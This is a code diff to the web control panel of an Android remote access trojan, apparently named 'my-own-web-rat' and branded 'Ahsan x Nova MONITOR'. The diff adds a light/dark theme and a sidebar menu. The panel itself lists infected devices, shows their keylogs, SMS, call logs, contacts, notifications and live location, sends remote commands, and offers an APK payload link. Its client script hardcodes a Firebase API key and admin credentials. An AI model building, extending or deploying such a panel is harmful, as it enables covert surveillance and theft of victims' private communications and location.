@@ -12,7 +12,7 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
 <style>
-/* ================= NOVA PREMIUM CSS ================= */
+/* ================= NOVA PREMIUM CSS (LIGHT & DARK) ================= */
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 :root{
   --bg:#08080f;--bg2:#0f0f1a;--card:#14141f;--card2:#1c1c2b;--br:#2a2a3d;
@@ -22,14 +22,19 @@
   --gr3:linear-gradient(135deg,#10b981,#06b6d4);
   --gr4:linear-gradient(135deg,#ef4444,#f59e0b);
 }
+[data-theme="light"]{
+  --bg:#f4f4fa;--bg2:#ffffff;--card:#ffffff;--card2:#f0f0f5;--br:#e2e2f0;
+  --tx:#0a0a15;--tx2:#4a4a60;--tx3:#8a8aa0;
+}
 html{scroll-behavior:smooth}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;color:var(--tx);background:var(--bg);min-height:100vh;overflow-x:hidden;padding-bottom:80px}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;color:var(--tx);background:var(--bg);min-height:100vh;overflow-x:hidden;transition:background .3s,color .3s}
 body::before{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;background:radial-gradient(circle at 0% 0%,rgba(168,85,247,.12),transparent 50%),radial-gradient(circle at 100% 100%,rgba(6,182,212,.1),transparent 50%)}
+[data-theme="light"] body::before{background:radial-gradient(circle at 0% 0%,rgba(168,85,247,.05),transparent 50%),radial-gradient(circle at 100% 100%,rgba(6,182,212,.05),transparent 50%)}
 ::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-thumb{background:var(--br);border-radius:99px}
 
 /* LOGIN */
 #loginScreen{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;padding:1.5rem;background:var(--bg)}
-.login-card{width:100%;max-width:380px;padding:2.5rem 1.5rem;background:var(--card);border:1px solid var(--br);border-radius:28px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.5)}
+.login-card{width:100%;max-width:380px;padding:2.5rem 1.5rem;background:var(--card);border:1px solid var(--br);border-radius:28px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.2)}
 .login-logo{width:80px;height:80px;margin:0 auto 1rem;border-radius:20px;object-fit:cover;border:2px solid var(--pu);box-shadow:0 0 20px rgba(168,85,247,.4)}
 .login-card h1{font-size:1.5rem;font-weight:900;background:var(--gr1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:.2rem}
 .login-card p{font-size:.75rem;color:var(--tx3);text-transform:uppercase;letter-spacing:.1em;font-weight:700;margin-bottom:1.5rem}
@@ -40,24 +45,40 @@ body::before{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;ba
 .lg-btn{width:100%;padding:.85rem;margin-top:.5rem;font-size:.85rem;font-weight:800;color:#fff;background:var(--gr1);border:none;border-radius:12px;cursor:pointer}
 .lg-hint{margin-top:1.25rem;padding:.65rem;font-size:.65rem;color:var(--tx3);background:var(--bg2);border-radius:10px;border:1px dashed var(--br);word-break:break-all}
 
-/* HEADER */
-.top{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:.75rem 1rem;background:rgba(20,20,31,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--br)}
-.brand{display:flex;align-items:center;gap:.5rem;cursor:pointer}
+/* HEADER & TOP NAV */
+.top{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:.75rem 1rem;background:rgba(20,20,31,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--br);transition:background .3s}
+[data-theme="light"] .top{background:rgba(255,255,255,.95)}
+.brand-wrap{display:flex;align-items:center;gap:.5rem;cursor:pointer}
+.menu-btn{width:36px;height:36px;display:flex;align-items:center;justify-content:center;background:var(--bg2);border:1px solid var(--br);border-radius:10px;color:var(--tx);font-size:1.1rem;cursor:pointer}
 .brand img{width:38px;height:38px;border-radius:10px;object-fit:cover;border:1.5px solid var(--pu)}
 .brand h1{font-size:.9rem;font-weight:900;color:var(--tx)}
 .brand span{font-size:.5rem;color:var(--tx3);letter-spacing:.1em;display:block}
-.h-actions{display:flex;gap:.3rem;align-items:center}
-.h-btn{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:var(--bg2);border:1px solid var(--br);border-radius:9px;color:var(--tx2);cursor:pointer}
+.h-actions{display:flex;gap:.4rem;align-items:center}
+.h-btn{width:34px;height:34px;display:flex;align-items:center;justify-content:center;background:var(--bg2);border:1px solid var(--br);border-radius:10px;color:var(--tx2);cursor:pointer;font-size:1rem}
 .h-btn.crown{color:var(--or)}.h-btn.key{color:var(--gr)}.h-btn.apk{color:var(--pk)}.h-btn.out{color:var(--rd)}
 .pill{display:flex;align-items:center;gap:.25rem;padding:.3rem .5rem;font-size:.55rem;font-weight:800;border-radius:99px;background:var(--bg2);border:1px solid var(--br);text-transform:uppercase}
 .pill::before{content:'';width:6px;height:6px;border-radius:50%;background:currentColor}
 .pill.on{color:var(--gr)}.pill.off{color:var(--rd)}
 
+/* SIDE MENU (Drawer) */
+.sidebar{position:fixed;top:0;left:-280px;width:280px;height:100vh;background:var(--card);border-right:1px solid var(--br);z-index:1000;transition:left .3s ease;display:flex;flex-direction:column;overflow-y:auto}
+.sidebar.open{left:0;box-shadow:5px 0 30px rgba(0,0,0,.5)}
+.sidebar-head{display:flex;align-items:center;justify-content:space-between;padding:1rem;border-bottom:1px solid var(--br)}
+.sidebar-head h2{font-size:1rem;font-weight:900;color:var(--tx)}
+.sidebar-links{padding:1rem;display:flex;flex-direction:column;gap:.4rem}
+.s-link{display:flex;align-items:center;gap:.75rem;padding:.75rem 1rem;font-size:.85rem;font-weight:700;color:var(--tx2);background:transparent;border:none;border-radius:10px;cursor:pointer;text-align:left;transition:all .2s}
+.s-link i{font-size:1rem;width:20px;text-align:center;color:var(--tx3)}
+.s-link:active,.s-link:hover{background:var(--bg2);color:var(--tx)}
+.s-link.on{background:var(--gr1);color:#fff}
+.s-link.on i{color:#fff}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(3px);z-index:999;display:none}
+.overlay.on{display:block}
+
 /* CONTENT & PAGES */
-.content{padding:1rem;max-width:1000px;margin:0 auto;display:none}
+.content{padding:1rem;max-width:1000px;margin:0 auto;display:none;padding-bottom:2rem}
 .ptitle{display:flex;align-items:center;gap:.75rem;margin-bottom:1rem}
 .ptitle-ic{width:42px;height:42px;display:flex;align-items:center;justify-content:center;background:var(--gr1);border-radius:12px;color:#fff;font-size:1rem}
-.ptitle h1{font-size:1.15rem;font-weight:900}
+.ptitle h1{font-size:1.15rem;font-weight:900;color:var(--tx)}
 .ptitle p{font-size:.6rem;color:var(--tx3);text-transform:uppercase;letter-spacing:.05em}
 .back-btn{display:inline-flex;align-items:center;gap:.3rem;background:transparent;border:none;color:var(--pu);font-weight:700;font-size:.75rem;margin-bottom:1rem;cursor:pointer}
 .page{display:none}.page.active{display:block;animation:fadeIn .3s}
@@ -72,11 +93,11 @@ body::before{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;ba
 .stat.gr .s-ic{background:rgba(16,185,129,.15);color:var(--gr)}
 .stat.rd .s-ic{background:rgba(239,68,68,.15);color:var(--rd)}
 .stat.cy .s-ic{background:rgba(6,182,212,.15);color:var(--cy)}
-.s-val{font-size:1.4rem;font-weight:900;margin-bottom:.1rem}
+.s-val{font-size:1.4rem;font-weight:900;margin-bottom:.1rem;color:var(--tx)}
 .s-lbl{font-size:.55rem;font-weight:800;text-transform:uppercase;color:var(--tx3)}
 
 .sh{display:flex;align-items:center;justify-content:space-between;margin-bottom:.75rem}
-.sh h2{font-size:.85rem;font-weight:900;display:flex;align-items:center;gap:.4rem}
+.sh h2{font-size:.85rem;font-weight:900;display:flex;align-items:center;gap:.4rem;color:var(--tx)}
 .rf{display:flex;align-items:center;gap:.25rem;padding:.4rem .6rem;font-size:.65rem;font-weight:800;color:var(--tx2);background:var(--card);border:1px solid var(--br);border-radius:8px;cursor:pointer}
 
 /* DEVICE CARDS */
@@ -85,11 +106,11 @@ body::before{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;ba
 .dev-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:.75rem}
 .dev-info{display:flex;align-items:center;gap:.5rem;min-width:0}
 .dev-ic{width:38px;height:38px;display:flex;align-items:center;justify-content:center;background:var(--gr1);color:#fff;border-radius:10px;font-size:1rem}
-.dev-info h3{font-size:.85rem;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dev-info h3{font-size:.85rem;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:var(--tx)}
 .dev-info p{font-size:.6rem;color:var(--tx3)}
 .dev-meta{display:grid;grid-template-columns:repeat(3,1fr);gap:.5rem;padding-top:.75rem;border-top:1px dashed var(--br);margin-bottom:.75rem}
 .dev-meta span:first-child{display:block;font-size:.5rem;font-weight:800;color:var(--tx3);text-transform:uppercase}
-.dev-meta span:last-child{font-size:.7rem;font-weight:700}
+.dev-meta span:last-child{font-size:.7rem;font-weight:700;color:var(--tx)}
 .dev-btn{display:flex;align-items:center;justify-content:center;gap:.4rem;padding:.6rem;font-size:.75rem;font-weight:800;color:#fff;background:var(--gr1);border:none;border-radius:10px;cursor:pointer}
 .bdg{display:inline-flex;align-items:center;gap:.25rem;padding:.25rem .5rem;font-size:.55rem;font-weight:900;border-radius:99px}
 .bdg.on{color:var(--gr);background:rgba(16,185,129,.15)}.bdg.off{color:var(--rd);background:rgba(239,68,68,.15)}
@@ -97,7 +118,7 @@ body::before{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;ba
 /* INFO CARDS */
 .info-grid{display:grid;grid-template-columns:1fr;gap:.75rem}
 .icard{padding:.85rem;background:var(--card);border:1px solid var(--br);border-radius:14px}
-.icard h3{font-size:.75rem;font-weight:900;margin-bottom:.5rem;padding-bottom:.4rem;border-bottom:1px solid var(--br);display:flex;align-items:center;gap:.3rem}
+.icard h3{font-size:.75rem;font-weight:900;margin-bottom:.5rem;padding-bottom:.4rem;border-bottom:1px solid var(--br);display:flex;align-items:center;gap:.3rem;color:var(--tx)}
 .icard h3 i{color:var(--pu)}
 .irow{display:flex;justify-content:space-between;padding:.3rem 0;font-size:.7rem}
 .irow:not(:last-child){border-bottom:1px dashed var(--br)}
@@ -122,15 +143,8 @@ tr.sms-row:active{background:var(--bg2)}
 .ag{display:grid;grid-template-columns:repeat(2,1fr);gap:.5rem}.ag .full{grid-column:span 2}
 .term{background:#000;color:#0f0;font-family:monospace;font-size:.7rem;padding:.6rem;border-radius:9px;height:130px;overflow-y:auto;margin-bottom:.5rem}
 
-/* NAV BAR */
-.nav{position:fixed;bottom:0;left:0;right:0;z-index:200;background:rgba(20,20,31,.95);backdrop-filter:blur(10px);border-top:1px solid var(--br);padding:.4rem;display:flex;overflow-x:auto;scrollbar-width:none}
-.nav::-webkit-scrollbar{display:none}
-.nlink{flex-shrink:0;display:flex;flex-direction:column;align-items:center;gap:.15rem;padding:.3rem .5rem;min-width:55px;font-size:.5rem;font-weight:800;color:var(--tx3);border-radius:8px;cursor:pointer;text-transform:uppercase}
-.nlink.on{color:#fff;background:var(--gr1)}
-.nlink i{font-size:1rem}
-
 /* MODALS */
-.mdl{display:none;position:fixed;inset:0;z-index:1000;padding:1rem;background:rgba(0,0,0,.8);backdrop-filter:blur(5px);overflow-y:auto}
+.mdl{display:none;position:fixed;inset:0;z-index:1001;padding:1rem;background:rgba(0,0,0,.8);backdrop-filter:blur(5px);overflow-y:auto}
 .mdl.on{display:flex;align-items:flex-start;justify-content:center;padding-top:2rem}
 .mbox{width:100%;max-width:400px;background:var(--card);border-radius:20px;overflow:hidden;border:1px solid var(--br)}
 .mhead{display:flex;align-items:center;justify-content:space-between;padding:.85rem 1rem;background:var(--gr1);color:#fff}
@@ -163,15 +177,42 @@ tr.sms-row:active{background:var(--bg2)}
   </div>
 </div>
 
+<!-- ================= SIDEBAR MENU ================= -->
+<div class="overlay" id="sideOverlay" onclick="toggleMenu()"></div>
+<aside class="sidebar" id="sideMenu">
+  <div class="sidebar-head">
+    <h2><i class="fas fa-compass" style="color:var(--pu)"></i> Navigation</h2>
+    <button class="h-btn" onclick="toggleMenu()"><i class="fas fa-xmark"></i></button>
+  </div>
+  <div class="sidebar-links">
+    <button class="s-link on" id="n-devices" onclick="goPage('devices')"><i class="fas fa-layer-group"></i> All Devices</button>
+    <button class="s-link" id="n-detail" onclick="goPage('detail')"><i class="fas fa-gauge"></i> Dashboard</button>
+    <button class="s-link" id="n-remote" onclick="goPage('remote')"><i class="fas fa-satellite-dish"></i> Remote Control</button>
+    <button class="s-link" id="n-location" onclick="goPage('location')"><i class="fas fa-map-location-dot"></i> Live Location</button>
+    <button class="s-link" id="n-keylogs" onclick="goPage('keylogs')"><i class="fas fa-keyboard"></i> Keylogs</button>
+    <button class="s-link" id="n-info" onclick="goPage('info')"><i class="fas fa-circle-info"></i> System Info</button>
+    <button class="s-link" id="n-apps" onclick="goPage('apps')"><i class="fas fa-cubes"></i> Installed Apps</button>
+    <button class="s-link" id="n-calls" onclick="goPage('calls')"><i class="fas fa-phone"></i> Call Logs</button>
+    <button class="s-link" id="n-sms" onclick="goPage('sms')"><i class="fas fa-comment-dots"></i> SMS Logs</button>
+    <button class="s-link" id="n-contacts" onclick="goPage('contacts')"><i class="fas fa-address-book"></i> Contacts</button>
+    <button class="s-link" id="n-notifications" onclick="goPage('notifications')"><i class="fas fa-bell"></i> Notifications</button>
+  </div>
+</aside>
+
 <!-- ================= DASHBOARD ================= -->
 <div id="appMain" style="display:none;">
   
   <header class="top">
-    <div class="brand" onclick="goPage('devices')">
-      <img src="https://i.ibb.co/JFCSTtcZ/601653.jpg">
-      <div><h1>Ahsan x Nova</h1><span>MONITOR</span></div>
+    <div class="brand-wrap">
+      <button class="menu-btn" onclick="toggleMenu()"><i class="fas fa-bars"></i></button>
+      <div class="brand" onclick="goPage('devices')">
+        <img src="https://i.ibb.co/JFCSTtcZ/601653.jpg">
+        <div><h1>Ahsan x Nova</h1><span>MONITOR</span></div>
+      </div>
     </div>
     <div class="h-actions">
+      <!-- Theme Toggle (Sun/Moon) -->
+      <button class="h-btn" id="themeBtn" onclick="toggleTheme()"><i class="fas fa-sun"></i></button>
       <button class="h-btn crown" onclick="openM('adminModal')"><i class="fas fa-crown"></i></button>
       <button class="h-btn key" onclick="openM('passModal')"><i class="fas fa-key"></i></button>
       <button class="h-btn apk" onclick="openM('apkModal')"><i class="fas fa-download"></i></button>
@@ -181,7 +222,6 @@ tr.sms-row:active{background:var(--bg2)}
   </header>
 
   <main class="content" id="mainContent">
-
     <!-- PAGE 1: DEVICES -->
     <div id="p-devices" class="page active">
       <div class="ptitle">
@@ -200,7 +240,6 @@ tr.sms-row:active{background:var(--bg2)}
 
     <!-- PAGE 2: DEVICE DETAIL -->
     <div id="p-detail" class="page">
-      <button class="back-btn" onclick="goPage('devices')"><i class="fas fa-arrow-left"></i> Back to Devices</button>
       <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-mobile-screen"></i></div><div><h1 id="d-name">Device</h1><p id="d-id">ID: ...</p></div></div>
       <div style="display:flex;gap:.5rem;margin-bottom:1rem;align-items:center;">
         <button id="d-del" class="btn dgr" onclick="delDevice()" style="display:none;"><i class="fas fa-trash"></i> Delete</button>
@@ -273,7 +312,7 @@ tr.sms-row:active{background:var(--bg2)}
       <div class="tcard"><div class="tscroll"><table><thead><tr><th>Type</th><th>Number</th><th>Date</th></tr></thead><tbody id="calls-body"></tbody></table></div></div>
     </div>
 
-    <!-- PAGE 9: SMS (Clickable Rows) -->
+    <!-- PAGE 9: SMS -->
     <div id="p-sms" class="page">
       <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-comment-dots"></i></div><div><h1>SMS Logs</h1><p>Messages (Tap to Read)</p></div></div>
       <div class="sh"><h2>All SMS</h2><button class="rf" onclick="sendCmd('get_sms_log')"><i class="fas fa-sync-alt"></i> Fetch</button></div>
@@ -294,27 +333,9 @@ tr.sms-row:active{background:var(--bg2)}
     </div>
 
   </main>
-
-  <!-- BOTTOM NAV -->
-  <nav class="nav" id="bottomNav" style="display:none;">
-    <div class="nlink on" id="n-devices" onclick="goPage('devices')"><i class="fas fa-layer-group"></i><span>Devices</span></div>
-    <div class="nlink" id="n-detail" onclick="goPage('detail')"><i class="fas fa-gauge"></i><span>Dashboard</span></div>
-    <div class="nlink" id="n-remote" onclick="goPage('remote')"><i class="fas fa-satellite-dish"></i><span>Remote</span></div>
-    <div class="nlink" id="n-location" onclick="goPage('location')"><i class="fas fa-map-location-dot"></i><span>Location</span></div>
-    <div class="nlink" id="n-keylogs" onclick="goPage('keylogs')"><i class="fas fa-keyboard"></i><span>Keylogs</span></div>
-    <div class="nlink" id="n-info" onclick="goPage('info')"><i class="fas fa-circle-info"></i><span>Info</span></div>
-    <div class="nlink" id="n-apps" onclick="goPage('apps')"><i class="fas fa-cubes"></i><span>Apps</span></div>
-    <div class="nlink" id="n-calls" onclick="goPage('calls')"><i class="fas fa-phone"></i><span>Calls</span></div>
-    <div class="nlink" id="n-sms" onclick="goPage('sms')"><i class="fas fa-comment-dots"></i><span>SMS</span></div>
-    <div class="nlink" id="n-contacts" onclick="goPage('contacts')"><i class="fas fa-address-book"></i><span>Contacts</span></div>
-    <div class="nlink" id="n-notifications" onclick="goPage('notifications')"><i class="fas fa-bell"></i><span>Notif</span></div>
-  </nav>
-
-</div> <!-- END APP MAIN -->
+</div>
 
 <!-- ================= MODALS ================= -->
-
-<!-- SMS FULL VIEW MODAL -->
 <div id="smsViewModal" class="mdl">
   <div class="mbox">
     <div class="mhead" style="background:var(--gr3);">
@@ -333,7 +354,6 @@ tr.sms-row:active{background:var(--bg2)}
   </div>
 </div>
 
-<!-- ADMIN MODAL -->
 <div id="adminModal" class="mdl">
   <div class="mbox">
     <div class="mhead"><h2><i class="fas fa-crown"></i> Admin Panel</h2><button class="mclose" onclick="closeM('adminModal')"><i class="fas fa-xmark"></i></button></div>
@@ -355,7 +375,6 @@ tr.sms-row:active{background:var(--bg2)}
   </div>
 </div>
 
-<!-- PASSWORD MODAL -->
 <div id="passModal" class="mdl">
   <div class="mbox">
     <div class="mhead"><h2><i class="fas fa-key"></i> Change Login</h2><button class="mclose" onclick="closeM('passModal')"><i class="fas fa-xmark"></i></button></div>
@@ -372,7 +391,6 @@ tr.sms-row:active{background:var(--bg2)}
   </div>
 </div>
 
-<!-- APK MODAL -->
 <div id="apkModal" class="mdl">
   <div class="mbox">
     <div class="mhead"><h2><i class="fas fa-download"></i> APK Link</h2><button class="mclose" onclick="closeM('apkModal')"><i class="fas fa-xmark"></i></button></div>
@@ -388,6 +406,7 @@ tr.sms-row:active{background:var(--bg2)}
 
 <!-- ================= JAVASCRIPT ================= -->
 <script>
+// --- 1. FIREBASE SETUP ---
 const firebaseConfig = {
   apiKey: "AIzaSyDPz-lohZeb2fu-hDfrsvkEbpozU6Wkc6k",
   authDomain: "my-own-web-rat.firebaseapp.com",
@@ -400,11 +419,36 @@ const firebaseConfig = {
 if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
+// --- 2. VARIABLES ---
 const ADMIN_EMAIL = "theanonymous@gmail.com";
 const ADMIN_PASS = "theanonymousontop";
 let devices = {}, currentDevice = null, isAdmin = false, map = null, marker = null, logCache = [];
 
-window.onload = () => { checkSession(); loadHint(); };
+// --- 3. THEME & MENU LOGIC ---
+function initTheme() {
+    const theme = localStorage.getItem('nova_theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', theme);
+    updateThemeBtn(theme);
+}
+function toggleTheme() {
+    const current = document.documentElement.getAttribute('data-theme');
+    const next = current === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    localStorage.setItem('nova_theme', next);
+    updateThemeBtn(next);
+}
+function updateThemeBtn(theme) {
+    const btn = document.getElementById('themeBtn');
+    if(btn) btn.innerHTML = theme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
+}
+
+function toggleMenu() {
+    document.getElementById('sideMenu').classList.toggle('open');
+    document.getElementById('sideOverlay').classList.toggle('on');
+}
+
+// --- 4. APP INIT & LOGIN ---
+window.onload = () => { initTheme(); checkSession(); loadHint(); };
 
 async function loadHint() {
     const s = await db.ref('webLogin').once('value');
@@ -449,70 +493,20 @@ function startApp() {
 
 function logout() { localStorage.clear(); location.reload(); }
 
-function openM(id) { document.getElementById(id).classList.add('on'); }
-function closeM(id) { document.getElementById(id).classList.remove('on'); }
-
-async function adminLogin() {
-    if (document.getElementById('ad-email').value === ADMIN_EMAIL && document.getElementById('ad-pass').value === ADMIN_PASS) {
-        isAdmin = true; localStorage.setItem('nova_admin', 'true');
-        document.getElementById('ad-view-login').style.display = 'none';
-        document.getElementById('ad-view-dash').style.display = 'block';
-        loadAdminData();
-    } else alert('❌ Invalid Admin');
-}
-
-async function loadAdminData() {
-    const snap = await db.ref('users').once('value');
-    const users = snap.val() || {};
-    let html = '', total = 0, online = 0;
-    for (const key in users) {
-        const u = users[key];
-        if (u.email === ADMIN_EMAIL) continue;
-        total++; if (u.status === 'online') online++;
-        const isB = await db.ref('blockedEmails/' + u.email.replace(/\./g, '_')).once('value');
-        html += `<tr><td>${u.email}</td><td>${isB.exists() ? '<span style="color:red">Blocked</span>' : `<button class="btn dgr" style="padding:.2rem .4rem;font-size:.6rem" onclick="blockUser('${u.email}')">Block</button>`}</td></tr>`;
-    }
-    document.getElementById('ad-users').textContent = total;
-    document.getElementById('ad-online').textContent = online;
-    document.getElementById('ad-list').innerHTML = html || '<tr><td colspan="2">No users</td></tr>';
-    const bSnap = await db.ref('blockedEmails').once('value');
-    document.getElementById('ad-blocked').textContent = bSnap.exists() ? Object.keys(bSnap.val()).length : 0;
-}
-
-async function blockUser(email) {
-    if(!confirm('Block ' + email + '?')) return;
-    await db.ref('blockedEmails/' + email.replace(/\./g, '_')).set({ email, time: Date.now() });
-    loadAdminData();
-}
-
-function verifyPassAdmin() {
-    if (document.getElementById('pass-email').value === ADMIN_EMAIL && document.getElementById('pass-pass').value === ADMIN_PASS) {
-        document.getElementById('pass-view-auth').style.display = 'none';
-        document.getElementById('pass-view-form').style.display = 'block';
-    } else alert('❌ Invalid Admin');
-}
-
-async function saveNewLogin() {
-    const ne = document.getElementById('new-email').value.trim(), np = document.getElementById('new-pass').value.trim();
-    if (!ne || !np) return alert('Fill both fields');
-    await db.ref('webLogin').set({ email: ne, password: np, showHint: true });
-    alert('✅ Login Updated'); closeM('passModal'); loadHint();
-}
-
-function copyApk() { const i = document.getElementById('apkLink'); i.select(); document.execCommand('copy'); alert('Copied!'); }
-
+// --- 5. NAVIGATION ---
 function goPage(page) {
+    if(window.innerWidth < 768) toggleMenu(); // Close menu on mobile
+    
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById('p-' + page).classList.add('active');
-    document.querySelectorAll('.nlink').forEach(n => n.classList.remove('on'));
     
-    const navMap = { devices:'devices', detail:'detail', remote:'remote', location:'location', keylogs:'keylogs', info:'info', apps:'apps', calls:'calls', sms:'sms', contacts:'contacts', notifications:'notifications' };
-    if(navMap[page] && document.getElementById('n-' + navMap[page])) document.getElementById('n-' + navMap[page]).classList.add('on');
+    document.querySelectorAll('.s-link').forEach(n => n.classList.remove('on'));
+    if(document.getElementById('n-' + page)) document.getElementById('n-' + page).classList.add('on');
 
-    document.getElementById('bottomNav').style.display = (page === 'devices') ? 'none' : 'flex';
     if (currentDevice && page !== 'devices') loadPageData(page);
 }
 
+// --- 6. DATA LISTENERS ---
 function initDataListeners() {
     db.ref('.info/connected').on('value', s => {
         const on = s.val() === true;
@@ -551,8 +545,12 @@ function renderDevices() {
     }).join('');
 }
 
-function openDevice(id) { currentDevice = id; goPage('detail'); }
+function openDevice(id) {
+    currentDevice = id;
+    goPage('detail');
+}
 
+// --- 7. LOAD PAGE SPECIFIC DATA ---
 function loadPageData(page) {
     const dev = devices[currentDevice] || {};
     const ref = db.ref(`data/${currentDevice}`);
@@ -614,7 +612,6 @@ function loadPageData(page) {
     else if (page === 'sms') {
         ref.child('sms').limitToLast(100).on('value', s => {
             const m = s.val() || {};
-            // Add click event to open full SMS
             document.getElementById('sms-body').innerHTML = Object.values(m).reverse().map(x => {
                 const bodyEsc = (x.body||'').replace(/'/g, "\\'").replace(/"/g, '&quot;').replace(/\n/g, ' ');
                 return `<tr class="sms-row" onclick="viewSms('${x.address||'-'}', '${bodyEsc}', '${x.date||''}')">
@@ -638,7 +635,6 @@ function loadPageData(page) {
     }
 }
 
-// SMS Full View Modal trigger
 function viewSms(address, body, date) {
     document.getElementById('sms-v-address').textContent = address;
     document.getElementById('sms-v-date').textContent = date ? new Date(parseInt(date)).toLocaleString() : 'Unknown Time';
@@ -651,6 +647,7 @@ function renderLogs(logs) {
 }
 function filterLogs(txt) { renderLogs(logCache.filter(l => (l.appName||'').toLowerCase().includes(txt.toLowerCase()) || (l.text||'').toLowerCase().includes(txt.toLowerCase()))); }
 
+// --- 8. COMMANDS & MODALS ---
 function sendCmd(type, extras = {}) {
     if (!currentDevice) return alert('Select a device first');
     db.ref(`commands/${currentDevice}`).push({ type, timestamp: firebase.database.ServerValue.TIMESTAMP, ...extras }).then(() => alert('✅ Command Sent!'));
@@ -667,6 +664,58 @@ function delDevice() {
     if (!confirm('Delete this device completely?')) return;
     Promise.all([db.ref(`devices/${currentDevice}`).remove(), db.ref(`data/${currentDevice}`).remove(), db.ref(`commands/${currentDevice}`).remove()]).then(() => { alert('Deleted'); goPage('devices'); });
 }
+
+function openM(id) { document.getElementById(id).classList.add('on'); }
+function closeM(id) { document.getElementById(id).classList.remove('on'); }
+
+async function adminLogin() {
+    if (document.getElementById('ad-email').value === ADMIN_EMAIL && document.getElementById('ad-pass').value === ADMIN_PASS) {
+        isAdmin = true; localStorage.setItem('nova_admin', 'true');
+        document.getElementById('ad-view-login').style.display = 'none';
+        document.getElementById('ad-view-dash').style.display = 'block';
+        loadAdminData();
+    } else alert('❌ Invalid Admin');
+}
+
+async function loadAdminData() {
+    const snap = await db.ref('users').once('value');
+    const users = snap.val() || {};
+    let html = '', total = 0, online = 0;
+    for (const key in users) {
+        const u = users[key];
+        if (u.email === ADMIN_EMAIL) continue;
+        total++; if (u.status === 'online') online++;
+        const isB = await db.ref('blockedEmails/' + u.email.replace(/\./g, '_')).once('value');
+        html += `<tr><td>${u.email}</td><td>${isB.exists() ? '<span style="color:red">Blocked</span>' : `<button class="btn dgr" style="padding:.2rem .4rem;font-size:.6rem" onclick="blockUser('${u.email}')">Block</button>`}</td></tr>`;
+    }
+    document.getElementById('ad-users').textContent = total;
+    document.getElementById('ad-online').textContent = online;
+    document.getElementById('ad-list').innerHTML = html || '<tr><td colspan="2">No users</td></tr>';
+    const bSnap = await db.ref('blockedEmails').once('value');
+    document.getElementById('ad-blocked').textContent = bSnap.exists() ? Object.keys(bSnap.val()).length : 0;
+}
+
+async function blockUser(email) {
+    if(!confirm('Block ' + email + '?')) return;
+    await db.ref('blockedEmails/' + email.replace(/\./g, '_')).set({ email, time: Date.now() });
+    loadAdminData();
+}
+
+function verifyPassAdmin() {
+    if (document.getElementById('pass-email').value === ADMIN_EMAIL && document.getElementById('pass-pass').value === ADMIN_PASS) {
+        document.getElementById('pass-view-auth').style.display = 'none';
+        document.getElementById('pass-view-form').style.display = 'block';
+    } else alert('❌ Invalid Admin');
+}
+
+async function saveNewLogin() {
+    const ne = document.getElementById('new-email').value.trim(), np = document.getElementById('new-pass').value.trim();
+    if (!ne || !np) return alert('Fill both fields');
+    await db.ref('webLogin').set({ email: ne, password: np, showHint: true });
+    alert('✅ Login Updated'); closeM('passModal'); loadHint();
+}
+
+function copyApk() { const i = document.getElementById('apkLink'); i.select(); document.execCommand('copy'); alert('Copied!'); }
 
 if(localStorage.getItem('nova_admin') === 'true') isAdmin = true;
 </script>
